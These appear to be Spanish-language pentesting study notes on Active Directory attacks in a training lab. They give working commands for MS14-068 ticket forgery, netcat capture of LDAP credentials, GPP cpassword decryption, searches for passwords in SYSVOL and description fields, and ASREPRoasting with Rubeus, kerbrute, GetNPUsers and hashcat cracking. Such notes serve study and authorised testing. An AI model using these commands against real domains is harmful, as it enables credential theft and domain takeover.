AAB#ASREPRoasting 
## **Exchange Related Group Membership**

El grupo `Exchange Windows Permissions`no está considerado como protected group, pero los miembros de este grupo tienen la habilidad de escribir DACL en objetos del dominio, lo cual puede terminar dándonos privilegios de DSync. El grupo  `Organization Management` es un grupo extremadamente poderoso también (”domain admins” de exchange)

En este [repositorio de github](https://github.com/gdedrouas/Exchange-AD-Privesc/blob/master/DomainObject/DomainObject.md) se pueden ver varias técnicas de ataque para los miembros de este grupo.
### PrivExchange
El servicio exchange corre como SYSTEM y es un grupo con más privilegios de los normales por defecto. Este ataque permite que cualquier usuario con correo fuerce al Exchange a autenticarse en otro host (NTLM Relay), lo que puede llevar a la obtención de privilegios de administrador de dominio.

## Printer Bug

## MS14-086

Es una falla de vulnerabilidad en la autenticación kerberos que permite crear tickets PAC (información que se adhiere a un ticket TGT) de manera que se acepten como legítimos por el KDC. La idea es crear el ticket en el que el usuario se presenta como Administrador del DC. Puede ser explotado con herraminetas como [Python Kerberos Exploitation Kit (PyKEK)](https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS14-068/pykek) o con impacket.

## Capturando credenciales LDAP

Hay un [post interesante](https://grimhacker.com/2018/03/09/just-a-printer/) en el que nos cuentan como capturar credenciales. La idea detrás de esto es que hay aplicaciones o impresoras que guardan las contraseñas LDAP en la consola de administración. En otras ocasiones, las aplicaciones tienen una función “Test Connection”, que puede envíar credenciales en texto claro, por lo que podríamos capturarlas del siguiente modo:

```powershell
sudo nc -k -v -l -p 386
```

## Enumerando DNS

Podemos utilizar una herramienta como [adidnsdump](https://github.com/dirkjanm/adidnsdump) para enumerar todos los registros DNS de un dominio utilizando una cuenta de usuario de dominio válida. Esto resulta especialmente útil si la convención de nombres para los hosts que nos devuelven en nuestra enumeración utilizando herramientas como `BloodHound`es similar a `SRV01934.INLANEFREIGHT.LOCAL`. Si todos los servidores y estaciones de trabajo tienen un nombre no descriptivo, nos resulta difícil saber qué atacar exactamente. Si podemos acceder a las entradas DNS en AD, podemos descubrir potencialmente registros DNS interesantes que apunten a este mismo servidor

```powershell
adidnsdump -u inlanefreight\\\\forend ldap://172.16.5.5 -r
```

Devuelve un archivo `recrds.csv`

## Contraseñas en el campo description_field

```powershell
Get-DomainUser * | Select-Object samaccountname,description |Where-Object {$_.Description -ne $null}

samaccountname description
-------------- -----------
administrator  Built-in account for administering the computer/domain
guest          Built-in account for guest access to the computer/domain
krbtgt         Key Distribution Center Service Account
ldap.agent     *** DO NOT CHANGE ***  3/12/2012: Sunsh1ne4All!
```

## PASSWD_NOTREQD

```powershell
Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useraccountcontrol
```

## Credenciales en SMB y SYSVOL

**SYSVOL** es una carpeta compartida en los **controladores de dominio (DC)** de un entorno de **Active Directory (AD)**. Es utilizada para **almacenar y replicar archivos y scripts** necesarios para la administración del dominio. En ocasiones puede haber información interesante como scripts de inicio de sesión o archivos de políticas de grupo (GPO), que pueden contener credenciales en texto plano

Ejemplo de de muestra de información de sysvol desde un equipo unido al DC

```powershell
ls \\\\academy-ea-dc01\\SYSVOL\\INLANEFREIGHT.LOCAL\\
```

### Group Policy Preferences (GPP) Passwords

Cuando una GPP se crea, se almacena en un archivo `.xml` en sysvol. Este archivo contiene un array de configuraciones y contraseñas. Hay un campo `cpassword`, que está encriptado con AES-256, pero microsoft [publicó la llave privada](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-gppref/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be?redirectedfrom=MSDN) ( [MS14-025 Vulnerability in GPP could allow elevation of privilege](https://support.microsoft.com/en-us/topic/ms14-025-vulnerability-in-group-policy-preferences-could-allow-elevation-of-privilege-may-13-2014-60734e15-af79-26ca-ea53-8cd617073c30))

El valor de `cpassword` puede ser descifrado del siguiente modo:
```powershell
gpp-decrypt VPe/o9YRyz2cksnYRbNeQj35w9KxQ5ttbvtRaAVqxaE
```

Estas contraseñas pueden ser buscadas con herramientas como  [Get-GPPPassword.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1)

También se pueden localizar contraseñas con `nxc`,
```powershell
# Para mostrar los módulos relacionados con gpp
crackmapexec smb -L | grep gpp
# Usando el módulo gpp_autologin para volcar información de registry.xml
crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M gpp_autologin
```

## ASREPRoasting

Cualquier usuario del dominio puede solicitar un Ticket Granting Ticket (TGT) de una cuenta que tenga deshabilitada la opción de preautenticación kerberos.
### Con powershell + rubeus
- Encontrar usuarios con `**DONT_REQ_PREAUTH`: `Get-DomainUser`
	```powershell
	Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol | fl
	```
- Recuperación AS-REP en formato adecuado mediante Rubeus (supongamos `mmorgan` tiene deshabilitada preautenticación)
	```powershell
	.\\Rubeus.exe asreproast /user:mmorgan /nowrap /format:hashcat
	```
### Búsqueda de usuarios + Recuperación **AS-REP: `kerbrute`**
El siguiente comando nos mostrará, además de los usuarios del dominio, aquellos sobre los que se puede realizar aspreproasting + su hash
```bash
kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt 
```

### Busqueda de usuarios + recuperación AS-REP: `GetNPUsers.py`
Con esta herramienta podemos hacer lo mismo que con el comando anterior, pero necesitaremos una lista válida de usuarios del DC
```bash
GetNPUsers.py INLANEFREIGHT.LOCAL/ -dc-ip 172.16.5.5 -no-pass -usersfile valid_ad_users 
```
### Descifrando el hash con hashcat
```bash
hashcat -m 18200 ilfreight_asrep /usr/share/wordlists/rockyou.txt 
```

